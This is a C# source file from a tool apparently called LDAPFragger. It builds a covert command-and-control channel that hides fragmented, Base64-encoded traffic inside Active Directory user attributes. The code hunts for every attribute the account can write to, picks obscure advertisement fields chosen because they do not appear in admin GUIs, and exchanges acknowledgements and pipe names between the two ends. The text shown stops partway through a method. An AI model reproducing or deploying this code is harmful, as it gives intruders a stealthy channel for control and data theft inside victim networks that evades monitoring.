using System;
using System.Collections.Generic;
using System.DirectoryServices;
using System.DirectoryServices.ActiveDirectory;
using System.Linq;
using System.Text;


namespace LDAPFragger.Core
{

    class LDAP
    {

        #region message classes

        private class LDAPMessage
        {

            /*
               * 
               * LDAP messages should look like this:
               *  Type:
               *  ID:
               *  Parts:
               *  MessageID:
               *  Message:
               * 
               * Possible values:
               *  Type
               *      0 - Server
               *      1 - Client
               *      
               *  ID
               *      4 random alphanumeric chars to distinguish between multiple clients/servers. 
               * 
               *  Parts
               *      Used to specify the amount of packets
               *      
               *  MessageID
               *      5 random alphanumeric chars to identify messages for sending ACKs back to the source
               * 
               *  Message
               *      Base64 encoded byte array
               *  
               *  Type,ID and Message should be seperated by \r\n. The entire message is encoded into Base64 and written to the LDAP attribute
               *  Example:
               *      Type:0
               *      ID:vBd1
               *      Parts:1/15
               *      MessageID:dfF31
               *      Message:aabbetc==
               * */


            public int Part             { get; set; }
            public int NumberOfParts    { get; set; }
            public int Type             { get; set; }
            public string ID            { get; set; }
            public string sMessage      { get; set; }
            public string MessageID     { get; set; }

            public LDAPMessage(string base64Blob)
            {
                // Decode message. Check if message is fragmented
                string msg = ASCIIEncoding.ASCII.GetString(Misc.Base64Decode(base64Blob));
                string[] msgLines = msg.Split(new string[] { System.Environment.NewLine }, StringSplitOptions.None);

                // Type
                string[] parts = msgLines[0].Split(':');
                Type = Convert.ToInt32(parts[1]);

                // ID
                parts = msgLines[1].Split(':');
                ID = parts[1];

                // Parts            
                parts = msgLines[2].Split(':');
                Part = Convert.ToInt32(parts[1].Split('/')[0]);
                NumberOfParts = Convert.ToInt32(parts[1].Split('/')[1]);

                // Message ID
                parts = msgLines[3].Split(':');
                MessageID = parts[1];

                // Message
                parts = msgLines[4].Split(':');
                sMessage = parts[1];                
            }
        }

        private class ACKMessage
        {

            /*
               * 
               * LDAP messages should look like this:
               *  Type:
               *  ID:
               *  MessageID:
               * 
               * Possible values:
               *  Type
               *      0 - Server
               *      1 - Client
               *      
               *  ID
               *      4 random alphanumeric chars to distinguish between multiple clients/servers. 
               * 
               *      
               *  MessageID
               *      5 random alphanumeric chars to identify messages for sending ACKs back to the source
               *  
               *  The entire message is encoded into Base64 and written to the LDAP attribute
               *  Example:
               *      Type:0
               *      ID:vBd1
               *      MessageID:dfF31
               * */


            public int Type         { get; set; }
            public string ID        { get; set; } 
            public string MessageID { get; set; }

            public ACKMessage(string base64Blob)
            {
                // Decode message. Check if message is fragmented
                string msg = ASCIIEncoding.ASCII.GetString(Misc.Base64Decode(base64Blob));
                string[] msgLines = msg.Split(new string[] { System.Environment.NewLine }, StringSplitOptions.None);


                // Type
                string[] parts = msgLines[0].Split(':');
                Type = Convert.ToInt32(parts[1]);

                // ID
                parts = msgLines[1].Split(':');
                ID = parts[1];

                // Message ID
                parts = msgLines[2].Split(':');
                MessageID = parts[1];
            }


        }

        private class Advertisement
        {
            /*
             *  An advertisement message is an base64 encoded string with:
             *      8 bytes of crc an attrData name
             *      8 bytes of crc of attrState name
             *      8 bytes of crc of the chosen domain controller
             *      8 bytes of crc of the chosen architecture      
             *      8 bytes of string of the pipename
             */

            private string crcAttrData { get; set; }
            private string crcAttrState { get; set; }
            private string crcDomainController { get; set; }
            private string crcIs64BitProcess { get; set; }

            public string AttrData { get; set; }
            public string AttrState { get; set; }
            public string DomainController { get; set; }
            public bool Is64BitProcess { get; set; }

            public string pipeName { get; set; }

            public bool ParseSuccess { get; set; }

            public Advertisement(string base64Blob,
                    Dictionary<string, string> crcDomainControllerDictionary,
                    Dictionary<string, string> crcAttributeDictionary,
                    Dictionary<bool, string> crcArchitecture)
            {

                ParseSuccess = false;

                // Decode message.
                string msg = ASCIIEncoding.ASCII.GetString(Misc.Base64Decode(base64Blob));
                string[] msgLines = msg.Split(new string[] { System.Environment.NewLine }, StringSplitOptions.None);

                // client advertisements are 40 bytes
                if (msg.Length != 32 && msg.Length != 40)
                    return;

                // Chop into 4 pieces
                string[] parts = Misc.Chop(msg, 8);
                crcAttrData = parts[0];
                crcAttrState = parts[1];
                crcDomainController = parts[2];
                crcIs64BitProcess = parts[3];

                // Get pipename
                if (msg.Length == 40)
                    pipeName = parts[4];

                // read from dictionary
                AttrData = crcAttributeDictionary.FirstOrDefault(c => c.Value == crcAttrData).Key;
                AttrState = crcAttributeDictionary.FirstOrDefault(c => c.Value == crcAttrState).Key;
                DomainController = crcDomainControllerDictionary.FirstOrDefault(c => c.Value == crcDomainController).Key;
                Is64BitProcess = crcArchitecture.FirstOrDefault(c => c.Value == crcIs64BitProcess).Key;

                ParseSuccess = !string.IsNullOrEmpty(AttrData)
                            && !string.IsNullOrEmpty(AttrState)
                            && !string.IsNullOrEmpty(DomainController)
                            && !string.IsNullOrEmpty(crcIs64BitProcess);
            }
        }

        #endregion

        #region blacklist

        /// <summary>
        /// We need to override some attribute. Add them here, lowercase
        /// </summary>
        List<String> Attribute_BlackList = new List<string> { "ntsecuritydescriptor" };

        #endregion

        #region Properties
        /// <summary>
        /// Username to authenticate to AD
        /// </summary>
        internal string username               { get; set; }

        /// <summary>
        /// Password to authenticate to AD
        /// </summary>
        private string password               { get; set; }

        /// <summary>
        /// Name of the AD domain
        /// </summary>
        private string domain                 { get; set; }

        /// <summary>
        /// Distinguishedname of the authenticated useraccount
        /// </summary>
        private string userDistinguishedName { get; set; }

        /// <summary>
        /// Name of the attribute we're using to read/write data to
        /// TODO: Getters/setters
        /// </summary>
        private string Attribute = "info";

        /// <summary>
        /// DirectoryEntry that points to user account DN
        /// </summary>
        private DirectoryEntry DirectoryEntry;

        /// <summary>
        /// DirectoryEntry that points to user account DN of the remote user
        /// </summary>
        private DirectoryEntry remoteDirectoryEntry;

        /// <summary>
        /// FQDN of the domaincontroller
        /// </summary>
        private string domainController;

        /// <summary>
        /// DisintguishedName of the domain
        /// </summary>
        private string domainDistinguishedName;

        /// <summary>
        /// Used to determine whether we use integrated authentication to interact with AD
        /// </summary>
        private bool useIntegratedAuth = true;

        /// <summary>
        /// Max length of attribute
        /// </summary>
        private int AttributeUpperRange = 102400;            

        /// <summary>
        /// Used to determine if we interact as a client or as a server
        /// </summary>
        private bool IsClient;

        /// <summary>
        /// Header to send along with the data
        /// </summary>
        private string Header;

        /// <summary>
        /// Length of header when it's encoded in base64
        /// </summary>
        private int HeaderLength;

        /// <summary>
        /// ID to distinguish the origin of messages
        /// </summary>
        private string ID;

        /// <summary>
        /// Used to determine the client
        /// </summary>
        private int Type;

        /// <summary>
        /// Used for calculating CRC32 hashes
        /// </summary>
        Crc32 crc;

        /// <summary>
        /// Generated pipename
        /// </summary>
        public string pipeName { get; private set; }

        /// <summary>
        /// Use LDAP over TLS by default. 
        /// </summary>
        public bool UseLDAPS = true;

        public bool isX64 { get; private set; }

        #region dictionaries

        /// <summary>
        /// Dictionary with ldapAttributeNames and corresponding CRC32 hashes
        /// </summary>
        private Dictionary<string, string> crcAttributeDictionary;

        /// <summary>
        /// Dictionary with domaincontroller names and corresponding CRC
        /// </summary>
        private Dictionary<string, string> crcDomainControllerDictionary;

        /// <summary>
        /// Dictionary with ldapAttributeNames and corresponding rangeUpper limit
        /// </summary>
        private Dictionary<string, int> writeableAttributes;

        /// <summary>
        /// Dictionary with attributes and boolean to check whether attribute is single orm multivalued
        /// </summary>
        private Dictionary<string, bool> attributes;

        /// <summary>
        /// dictionary with crc values of x86 and x64
        /// </summary>
        private Dictionary<bool, string> crcArchitecture;

        #endregion

        #region attributes

        /// <summary>
        /// Name of the attribute to store data in
        /// </summary>
        private string attrData;

        /// <summary>
        /// Used to determine whether the attrData attribute is single or multivalued
        /// </summary>
        private bool attrDataSingleValued;

        /// <summary>
        /// Name of the attribute to store ACKs and advertisments in
        /// </summary>
        private string attrState;

        /// <summary>
        /// Used to determine whether the attrState attribute is single or multivalued
        /// </summary>
        private bool attrStateSingleValued;

        /// <summary>
        /// Name of the attribute receive data from of the remote client
        /// </summary>
        private string remoteAttrData;

        /// <summary>
        /// Name of the attribute to query for ACKs and advertisments of the remote client
        /// </summary>
        private string remoteAttrState;

        /// <summary>
        /// DistinguishedName of the remote user. used to monitor data\acks
        /// </summary>
        private string remoteUserDN;

        /// <summary>
        /// Static attributes used for advertisements. 
        /// Preferably, choose attributes that do not show up in the/a GUI and are present since the very start of AD
        /// </summary>
        string[] Attradvertisement = new string[] { "primaryInternationalISDNNumber", "otherFacsimileTelephoneNumber", "primaryTelexNumber" };

        /// <summary>
        /// attribute used for advertisement
        /// </summary>
        private string advertisementAttr;

        #endregion

        #endregion

        #region constructors


        /// <summary>
        /// initialize all needed info
        /// </summary>
        /// <param name="isClient"></param>
        /// <param name="attributeName"></param>
        private void Init(bool isClient)
        {
            this.IsClient = isClient;
            this.Header = CreateHeader().ToString();
            this.domainDistinguishedName = getDomainDistinguishedName();
            //this.Attribute = attributeName;
            //this.AttributeUpperRange = getUpperRangeAttribute(this.Attribute);

            crc = new Crc32();

            List<string> DomainControllers = getDomainControllerNames();
            this.domainController = DomainControllers[new Random().Next(0, DomainControllers.Count - 1)];

            // test connection
            if (!TestLDAPConnection())
                throw new Exception("Cannot connect to LDAP with supplied information");

            // check if we have write permission
            try
            {
                // this will also clear the attribute
                // TODO: Maybe check first if attribute is empty?

                ClearAttribute();
            }
            catch
            {
                // Nope
                throw new Exception("No write access to LDAP attribute");
            }

            // create CRC dictionary from domaincontrollers
            this.crcDomainControllerDictionary = GetCRCFromDomainControllerName(DomainControllers);

            // Create dictionary with ldapAttributeNames and corresponding CRC32 hashes
            this.crcAttributeDictionary = getSchemaAttributesAndCRC();

            // Create a dictionary with every writeable attribute and their rangeupper
            this.writeableAttributes = GetWriteableAttributes();
            SelectAttributes();

            // CRC for architecture
            this.crcArchitecture = new Dictionary<bool, string>();
            this.crcArchitecture.Add(true, crc.GetString("x64"));
            this.crcArchitecture.Add(false, crc.GetString("x86"));
        }

        public LDAP(bool IsClient, bool UseLDAPS)
        {
            this.UseLDAPS = UseLDAPS;

            if (string.IsNullOrEmpty(this.username))
            {
                getUserName();
                getDomainName();
            }

            Init(IsClient);

        }

        public LDAP(string Username, string Password, string Domain, bool IsClient, bool UseLDAPS)
        {
            this.username = Username;
            this.password = Password;
            this.domain   = Domain;
            this.useIntegratedAuth = false;
            this.UseLDAPS = UseLDAPS;

            Init(IsClient);
        }

        public LDAP(string Username, string Password, bool IsClient, bool UseLDAPS)
        {
            this.username = Username;
            this.password = Password;

            extractUsernames();
            if (string.IsNullOrEmpty(this.domain))
                getDomainName();

            this.useIntegratedAuth = false;
            this.IsClient = IsClient;
            this.UseLDAPS = UseLDAPS;

            Init(IsClient);      
        }
        #endregion

        #region public methods

        /// <summary>
        /// Contains all the logic for autodiscover client/server
        /// </summary>
        /// <returns></returns>
        public bool AutoDiscover()
        {

            var rnd = new Random();

            // We can use three attributes for advertisement. Pick a random attribute and write the advertisement to that attribute.            
            this.advertisementAttr = Attradvertisement[rnd.Next(0, Attradvertisement.Length - 1)];

            bool foundAdvertisement = false;

            if (this.IsClient)
            {
                bool advertiseResult = Advertise();

                int iSeconds = 120;
                int counter = 0;                

                do
                {
                    foundAdvertisement = FindAdvertisement();

                    counter++;
                    if (counter != iSeconds)
                        System.Threading.Thread.Sleep(1000);
                    else
                        break;
                } while (!foundAdvertisement);
            }
            else // Server will query for advertisement first
            {
                Misc.WriteGood(string.Format("Waiting for new advertisements..."));
                do
                {                    
                    foundAdvertisement = FindAdvertisement();
                    

                    //sleep a second
                    if (!foundAdvertisement)
                        System.Threading.Thread.Sleep(1000);

                } while (!foundAdvertisement);

                Misc.WriteGood(string.Format("Found advertisment. Sending our own advertisement"));
                Advertise();
                System.Threading.Thread.Sleep(1000);
            }

            // cleanup
            ClearAttribute(this.advertisementAttr);

            return foundAdvertisement;
        }


        /// <summary>
        /// Writes data to LDAP
        /// </summary>
        /// <param name="data"></param>
        public void Send(string base64blob)
        {
            List<string> Upload = new List<string>();
            Upload = createUploadList(base64blob);

            // Upload data
            foreach (var blob in Upload)
            {

                var checksum = crc.GetString(blob);
                this.DirectoryEntry.Properties[this.attrData].Value = blob;
                this.DirectoryEntry.CommitChanges();
                this.DirectoryEntry.RefreshCache();

                // Monitor AD for checksum to see if the message was correct
                // TODO: Max timeout
                bool result = false;
                string ldapQuery = string.Empty;

                if (string.IsNullOrEmpty(this.remoteAttrState))
                    ldapQuery = getAdvertisementQuery(checksum);
                else
                    ldapQuery = string.Format("(&(objectClass=user)(distinguishedName={0})({1}={2}))",
                        this.remoteUserDN, this.remoteAttrState, checksum);
                do
                {
                    var sResult = ReceiveRaw(new string[] { this.remoteAttrState }, ldapQuery);
                    if (sResult != null)
                    {
                        try
                        {
                            var crc = getAttributeValue(sResult, this.remoteAttrState);
                            result = crc == checksum;
                            break;
                        }
                        catch { }
                    }
                    else
                    {
                        System.Threading.Thread.Sleep(50);
                    }
                } while (!result);

                // Clear attribute
                ClearAttribute(this.attrData);

            }
        }
       
        /// <summary>
        /// Writes data to LDAP
        /// </summary>
        /// <param name="data"></param>
        public void Send(byte[] data)
        {            
            string base64Blob = Misc.Base64Encode(data);
            Send(base64Blob);
        }


        /// <summary>
        /// Receives data from LDAP
        /// </summary>
        /// <returns></returns>
        public byte[] Receive()
        {

            string crcValue, _crcValue = string.Empty;

            // check for a new message. If not, return null
            if (IsAttributeEmpty())
                return null;

            StringBuilder sBuilder = new StringBuilder();
            string resultString = ReceiveMessage(this.remoteAttrData, true);            

            // Decode message
            LDAPMessage msg = new LDAPMessage(resultString);
           
            sBuilder.Append(msg.sMessage);            
            string src = msg.Type == 0 ? "server" : "client";

            // write CRC to attrState
            crcValue = crc.GetString(resultString);
            SendRaw(crcValue, this.attrState, true);

            // Receive other messages if messages were sent fragmented
            if ((msg.NumberOfParts > 1) && (msg.Part < msg.NumberOfParts))
            {
                // Start at 1, we already got the first message
                for (int i = 1; i < msg.NumberOfParts; i++)
                {
                    bool NewMessage = false;

                    // Query the attribute until the message CRC is different
                    do
                    {
                        // Receive message
                        resultString = ReceiveMessage(this.remoteAttrData, true);
                        _crcValue = crc.GetString(resultString);
                        if (_crcValue != crcValue)
                        {
                            crcValue = _crcValue;
                            NewMessage = true;
                            break;
                        }

                        System.Threading.Thread.Sleep(50);

                    } while (!NewMessage);


                    // clear attribute
                    //ClearAttribute();

                    // Decode message
                    msg = new LDAPMessage(resultString);

                    // Check if partnumber is (i +1)              
                    if (msg.Part != i + 1)
                        throw new Exception($"Fragmentation exception. Got part {msg.Part}. Unable to proceed.");

                    // Append
                    sBuilder.Append(msg.sMessage);

                    // write CRC to attrState                    
                    SendRaw(crcValue, this.attrState, true);

                    Misc.WriteUpdate($"Receiving message {msg.Part}/{msg.NumberOfParts}");
                }
            }

            return Misc.Base64Decode(sBuilder.ToString());
        }

        /// <summary>
        /// method to test whether a connection to LDAP can be made. 
        /// </summary>
        /// <returns></returns>
        public bool TestLDAPConnection()
        {
            bool result = false;

            try
            {
                var dirEntry = getDirEntry();
                var dirSearcher = new DirectorySearcher(dirEntry);
                dirSearcher.Filter = string.Format("(&(sAMAccountName={0}))", this.username);
                var sResult = dirSearcher.FindOne();

                if (this.DirectoryEntry == null)
                    this.DirectoryEntry = sResult.GetDirectoryEntry();

                result = !string.IsNullOrEmpty(this.DirectoryEntry.Path);

                dirEntry.Dispose();
                dirSearcher.Dispose();

                // Todo: hide
                //Misc.WriteGood(string.Format("Found user distinguishedName: {0}", sResult.Path);

            }
            catch(Exception ex)
            {
                // just ignore it for now
            }

            return result;
        }

        /// <summary>
        /// Cleanup
        /// </summary>
        public void Dispose()
        {
            this.username = string.Empty;
            this.password = string.Empty;
            this.domain   = string.Empty;

            try
            {
                this.DirectoryEntry.Close();
                this.DirectoryEntry.Dispose();
            }
            catch { }
        }

        #endregion

        #region private methods

        /// <summary>
        /// Extracts value of given attribute from searchresult into a string
        /// </summary>
        /// <param name="sResult"></param>
        /// <param name="attribute"></param>
        /// <returns></returns>
        private string getAttributeValue(SearchResult sResult, string attribute)
        {
            object result = sResult.Properties[attribute][0];

            // Some objects can be byte[]            
            if (result.GetType() == (new byte[1]).GetType())
            {
                var asciiString = Encoding.ASCII.GetString((byte[])result);
                result = asciiString;
            }

            return result.ToString();
        }

        /// <summary>
        /// Writes advertisement to chosen atribute
        /// </summary>
        private bool Advertise()
        {            
            // select the CRC for attrState, attrData, domaincontroller and current architecture
            var crcData  = crcAttributeDictionary[this.attrData];
            var crcState = crcAttributeDictionary[this.attrState];         
            var crcDC    = crcDomainControllerDictionary[this.domainController];
            var crcArch  = crcArchitecture[Misc.Is64BitOS()];

            // Create a custom pipename
            this.pipeName = Misc.GenerateId(8);

            // Create and send advertisement
            var advertisement    = $"{crcData}{crcState}{crcDC}{crcArch}{pipeName}";            
            
            var advertiseMessage = Misc.Base64Encode(advertisement);
            SendRaw(advertiseMessage, this.advertisementAttr, true);
            Misc.WriteGood(string.Format("Advertisement '{0}' written to attribute: '{1}'", advertisement, this.advertisementAttr));

            // Search AD for matching CRC
            var crcValue  = crc.GetString(advertiseMessage);
            var ldapQuery = getAdvertisementQuery(crcValue);

            // search max 60 seconds for a CRC
            int counter    = 0;
            int maxRetries = 60;
            bool match = false;
            string attrValue = string.Empty;
            do
            {
                if (counter >= maxRetries)
                    break;

                SearchResult sResult = ReceiveRaw(this.Attradvertisement, ldapQuery);
                if (sResult == null)
                    continue;


                if (sResult.Properties.Count > 1)
                {
                    foreach (string attr in Attradvertisement)
                    {
                        try
                        {
                            attrValue = sResult.Properties[attr][0].ToString();                            
                            break;
                        }
                        catch
                        { // do nuthin
                        }
                    }
                }

                // CRC checks out
                if (attrValue == crcValue)
                    match = true;

                counter++;

                if (!match)
                    System.Threading.Thread.Sleep(1000);

            } while (!match);

            return match;
        }

        /// <summary>
        /// Queries AD to find advertisements
        /// </summary>
        /// <summary>
        /// Queries AD to find advertisements
        /// </summary>
        private bool FindAdvertisement()
        {

            string attrValue = string.Empty;
            string ldapQuery = getAdvertisementQuery();

            // Only 1 client/server supported for now
            SearchResult sResult = ReceiveRaw(this.Attradvertisement, ldapQuery);

            // No result
            if (sResult == null)
            {
                return false;
            }


            // if more properties can be found than just adspath, continue            
            if (sResult.Properties.Count > 1)
            {
                foreach (string attr in Attradvertisement)
                {
                    try
                    {
                        attrValue = sResult.Properties[attr][0].ToString();
                        this.remoteUserDN = sResult.Properties["distinguishedName"][0].ToString();
                        break;
                    }
                    catch
                    { // do nuthin
                    }
                }
            }

            // Write back the CRC of the message to our advertisement attribute
            var crcAttrValue = crc.GetString(attrValue);
            SendRaw(crcAttrValue, this.advertisementAttr, true);

            // Parse the result
            Advertisement adv = new Advertisement(attrValue, crcDomainControllerDictionary, crcAttributeDictionary, crcArchitecture);
            if (adv.ParseSuccess)
            {
                Misc.WriteGood(string.Format("Found advertisement:"));
                Misc.WriteGood(string.Format("\tUser distinguishedName: {0}", this.remoteUserDN));
                Misc.WriteGood(string.Format("\tData attribute: {0}", adv.AttrData));
                Misc.WriteGood(string.Format("\tState attribute: {0}", adv.AttrState));
                Misc.WriteGood(string.Format("\tArchitecture: {0}", adv.Is64BitProcess ? "x64" : "x86"));
                Misc.WriteGood(string.Format("\tDomainController: {0}", adv.DomainController));

                this.remoteAttrData = adv.AttrData;
                this.remoteAttrState = adv.AttrState;
                this.remoteDirectoryEntry = getDirEntry(this.remoteUserDN);
                this.isX64 = adv.Is64BitProcess;

                if (!string.IsNullOrEmpty(adv.pipeName))
                {
                    this.pipeName = adv.pipeName;
                    Misc.WriteGood(string.Format("\tPipename: {0}", adv.pipeName));
                }
            }


            return adv.ParseSuccess;
        }

        /// <summary>
        /// Generates an ldap query that excludes current user and searches for values in the advertisement attributes
        /// </summary>
        /// <param name="searchValue"></param>
        /// <returns></returns>
        private string getAdvertisementQuery(string searchValue = "*")
        {

            // the template for the LDAP query. For now, we focus on user accounts only.
            string ldapQueryTmpl = string.Empty;

            // change query if we know the user
            if (string.IsNullOrEmpty(this.remoteUserDN))
                ldapQueryTmpl = "(&(objectClass=user)(!samAccountName={0})(|{1}))";
            else
                ldapQueryTmpl = "(&(objectClass=user)(distinguishedName={0})(!samAccountName={1})(|{2}))";

            string ldapQuery = string.Empty;
            StringBuilder sBuilder = new StringBuilder();

            foreach (var attr in Attradvertisement)
                sBuilder.Append($"({attr}={searchValue})");

            if (string.IsNullOrEmpty(this.remoteUserDN))
                return ldapQuery = string.Format(ldapQueryTmpl, this.username, sBuilder.ToString());
            else
                return ldapQuery = string.Format(ldapQueryTmpl, this.remoteUserDN, this.username, sBuilder.ToString());
        }

        /// <summary>
        /// Queries AD to get value from specified attribute
        /// </summary>
        /// <param name="attribute"></param>
        /// <returns></returns>
        private SearchResult ReceiveRaw(string[] attribute, string ldapQuery)
        {
            // Use LDAP query to find advertisements
            var dirEntry = getDirEntry(this.domainDistinguishedName);
            var dirSearcher = new DirectorySearcher(dirEntry);
            dirSearcher.Filter = ldapQuery;
            dirSearcher.PropertiesToLoad.AddRange(attribute);
            dirSearcher.PropertiesToLoad.Add("distinguishedName");
            
            SearchResult sResult = dirSearcher.FindOne();

            //cleanup
            dirEntry.Dispose();
            dirSearcher.Dispose();

            return sResult;
        }

        /// <summary>
        /// Writes string to attribute without fragmenting. Handle with care
        /// </summary>
        /// <param name="value"></param>
        /// <param name="attribute"></param>
        /// <param name="ClearFirst"></param>
        private void SendRaw(string value, string attribute, bool ClearFirst = false)
        {

            this.DirectoryEntry.RefreshCache();
            if (ClearFirst)
            {
                ClearAttribute(attribute);
                this.DirectoryEntry.RefreshCache();
            }

            // Check if multivalued attribute
            if (this.attributes[attribute])
                this.DirectoryEntry.Properties[attribute].Value = value;
            else
                this.DirectoryEntry.Properties[attribute].Add(value);

            this.DirectoryEntry.CommitChanges();
        }


        /// <summary>
        /// Select largest attribute in the dictionary
        /// </summary>
        private void SelectAttributes()
        {
            var list = this.writeableAttributes.Values.ToList();
            list.Sort();
            list.Reverse();

            this.attrData  = this.writeableAttributes.FirstOrDefault(x => x.Value == list[0]).Key;
            this.attrState = this.writeableAttributes.FirstOrDefault(x => x.Value == list[1]).Key;

            // Check if attributes are multivalued
            this.attrDataSingleValued  = this.attributes[attrData];
            this.attrStateSingleValued = this.attributes[attrState];
        }

        /// <summary>
        /// Creates a list<string> with data to upload
        /// </summary>
        /// <param name="base64Blob"></param>
        /// <returns></returns>
        private List<string> createUploadList(string base64Blob)
        {

            string toSend = string.Empty;
            int base64blobLength = (int)Math.Ceiling((decimal)base64Blob.Length / 3) * 4;
            List<string> Upload = new List<string>();

            // If the complete message length exceeds the upper range of the attribute, fragment the message into multiple messages
            if ((HeaderLength + base64blobLength) > AttributeUpperRange)
            {
                // Count how many packets we need. reserve space for headerlength by substracting it from the upperange
                int parts = (int)Math.Ceiling((decimal)(HeaderLength + base64blobLength) / (AttributeUpperRange - HeaderLength));

                // Since the message is re-encoded in base64, reserve some extra space
                var chunks = Misc.Chop(base64Blob, ((((AttributeUpperRange - HeaderLength) / 4) * 3)));
                int chunkCount = chunks.Length;

                for (int i = 0; i < chunkCount; i++)
                {
                    // Generate message Id for this message
                    var msgId = Misc.GenerateId(5);

                    toSend = string.Format(Header, $"{i + 1}/{chunkCount}", msgId, chunks.ElementAt(i));
                    base64Blob = Misc.Base64Encode(Encoding.ASCII.GetBytes(toSend));
                    Upload.Add(base64Blob);
                }
            }
            else
            {
                // Generate message Id for this message
                var msgId = Misc.GenerateId(5);

                // Message fits in the attribute space
                toSend = string.Format(Header, "1/1", msgId, base64Blob);
                base64Blob = Misc.Base64Encode(Encoding.ASCII.GetBytes(toSend));
                Upload.Add(base64Blob);
            }

            return Upload;

        }

        /// <summary>
        /// Creates dictionary with DC and CRC32 hash
        /// </summary>
        /// <param name="domainControllers"></param>
        /// <returns></returns>
        private Dictionary<string, string> GetCRCFromDomainControllerName(List<string> domainControllers)
        {
            var dic = new Dictionary<string, string>();
            
            foreach (var dc in domainControllers)
            {
                dic.Add(dc, crc.GetString(dc));
            }

            return dic;
        }

        /// <summary>
        /// Creates a dictionary with every attribute the user account can write to and corresponding rangeupper value
        /// </summary>
        /// <returns></returns>
        private Dictionary<string, int> GetWriteableAttributes()
        {

            Dictionary<string, int> result = new Dictionary<string, int>();
            int rangeUpper = 0;

            // get attributes for object class user
            this.attributes = GetSchemaAttributes();

            foreach (string attribute in attributes.Keys)
            {

                if (attribute == "mSMQSignCertificates")
                {

                }

                // check if attribute is blacklisted
                if (this.Attribute_BlackList.Contains(attribute.ToLower()))
                    continue;

                // Continue if attribute is already filled with data
                if (!IsAttributeEmpty(attribute, false))
                { }
                //continue;

                // Check if we can write to the attribute
                try
                {
                    SendRaw(" ", attribute, true);
                    ClearAttribute(attribute);
                }
                catch { continue; }

                // Yay, writeable attribute found. 
                // Get the rangeUpper of the attribute and add it to the dictionary
                rangeUpper = getUpperRangeAttribute(attribute);

                if (rangeUpper == -1)
                    continue;


                result.Add(attribute, rangeUpper);

            }

            return result;
        }

        /// <summary>
        /// queries all attributes for given objectclass
        /// </summary>
        /// <param name="objectClass"></param>
        /// <returns></returns>
        private Dictionary<string, bool> GetSchemaAttributes(string objectClass = "user")
        {
            Dictionary<string, bool> result = new Dictionary<string, bool>();

            var ctx = GetDirectoryContext(DirectoryContextType.Forest);            
            ActiveDirectorySchema schema = ActiveDirectorySchema.GetSchema(ctx);
            ActiveDirectorySchemaClass person = schema.FindClass(objectClass);

            foreach (ActiveDirectorySchemaProperty property in person.GetAllProperties())
            {
                result.Add(property.Name, property.IsSingleValued);                
            }

            // cleanup
            person.Dispose();
            schema.Dispose();

            return result;

        }

        /// <summary>
        /// Returns an authenticated directoryContext object
        /// </summary>
        /// <returns></returns>
        private DirectoryContext GetDirectoryContext(DirectoryContextType ctxType = DirectoryContextType.Domain)
        {
            
            var ctx = new DirectoryContext(ctxType);

            if (!useIntegratedAuth)
                ctx = new DirectoryContext(ctxType, this.domain , this.username, this.password);

            return ctx;
        }

        /// <summary>
        /// Generates a dictionary with ldapDisplayNames of attributes in the AD schema and the corresponding CRC32 hash
        /// </summary>
        /// <returns></returns>
        private Dictionary<string, string> getSchemaAttributesAndCRC()
        {
            Dictionary<string, string> result = new Dictionary<string, string>();
            //Crc32 crcChecksum = new Crc32();


            if (string.IsNullOrEmpty(this.domainDistinguishedName))
                this.domainDistinguishedName = getDomainDistinguishedName();

            string schemaDN = string.Format("CN=Schema,CN=Configuration,{0}", this.domainDistinguishedName);
            var dirEntry = getDirEntry(schemaDN);
            var dirSearcher = new DirectorySearcher(dirEntry);

            dirSearcher.Filter = "(&(objectClass=attributeSchema)(LDAPDisplayName=*))";
            dirSearcher.PropertiesToLoad.Add("lDAPDisplayName");
            dirSearcher.PageSize  = 100000;
            dirSearcher.SizeLimit = 100000;
            var sResults = dirSearcher.FindAll();

            foreach (SearchResult sResult in sResults)
            {
                var attrName = sResult.Properties["lDAPDisplayName"][0].ToString();
                var crc32 = crc.GetString(attrName);

                result.Add(attrName, crc32);
            }

            // cleanup            
            dirSearcher.Dispose();
            dirEntry.Dispose();

            return result;

        }

        /// <summary>
        /// Queries the rangeUpper of given attribute
        /// </summary>
        /// <param name="attributeName"></param>
        /// <returns></returns>
        private int getUpperRangeAttribute(string attributeName)
        {
            int result = -1;

            if (string.IsNullOrEmpty(this.domainDistinguishedName))
                this.domainDistinguishedName = getDomainDistinguishedName();

            string schemaDN = string.Format("CN=Schema,CN=Configuration,{0}", this.domainDistinguishedName);
            var dirEntry    = getDirEntry(schemaDN);
            var dirSearcher = new DirectorySearcher(dirEntry);

            dirSearcher.Filter = $"(&(objectClass=attributeSchema)(LDAPDisplayName={attributeName})(rangeUpper=*))";
            dirSearcher.PropertiesToLoad.Add("rangeUpper");      
            var sResult = dirSearcher.FindOne();

            // Might result in an exception...
            // TODO: think of something

            try
            {
                result = Convert.ToInt32(sResult.Properties["rangeUpper"][0]);
            }
            catch { /* Don't do nuthin' */}

            //cleanup
            dirSearcher.Dispose();
            dirEntry.Dispose();
            
            return result;
        }

        /// <summary>
        /// Writes an empty string to the attribute
        /// </summary>
        private void ClearAttribute(string attributeName = "")
        {
            if (string.IsNullOrEmpty(attributeName))
                attributeName = this.Attribute;

            this.DirectoryEntry.Properties[attributeName].Clear();
            this.DirectoryEntry.CommitChanges();
            this.DirectoryEntry.RefreshCache();
        }

        /// <summary>
        /// Queries LDAP for a new message
        /// </summary>
        /// <returns></returns>
        private string ReceiveMessage(string attribute, bool remote)
        {
            // Read value from LDAP
            var dirEntry = remote ? this.remoteDirectoryEntry : this.DirectoryEntry;
            var dirSearcher = new DirectorySearcher(dirEntry);
            SearchResult res = null;
            dirSearcher.PropertiesToLoad.Add(attribute);


            bool gotResult = false;
            object result = null;
            int counter = 0;
            int maxRetries = 10;

            do
            {
                try
                {
                    res = dirSearcher.FindOne();
                    result = res.Properties[attribute][0];
                    gotResult = true;
                }
                catch (ArgumentOutOfRangeException aEx)
                {
                    System.Threading.Thread.Sleep(100);
                    counter++;

                    if (counter == maxRetries)
                        throw new Exception("Cannot find LDAP message.");
                }
            }
            while (!gotResult);


            // Some objects can be byte[]            
            if (result.GetType() == (new byte[1]).GetType())
            {
                var asciiString = Encoding.ASCII.GetString((byte[])result);
                result = asciiString;
            }

            var resultString = result.ToString();

            //cleanup
            dirSearcher.Dispose();
            res = null;

            return resultString;
        }
        /// <summary>
        /// Checks if chosen attribute is empty. 
        /// TODO: Maybe there's a more efficient way to check this
        /// </summary>
        /// <returns></returns>
        private bool IsAttributeEmpty(string attributeName = "", bool remote = true)
        {
            bool result = false;

            if (string.IsNullOrEmpty(attributeName))
                attributeName = this.remoteAttrData;

            // Use LDAP query to find advertisements
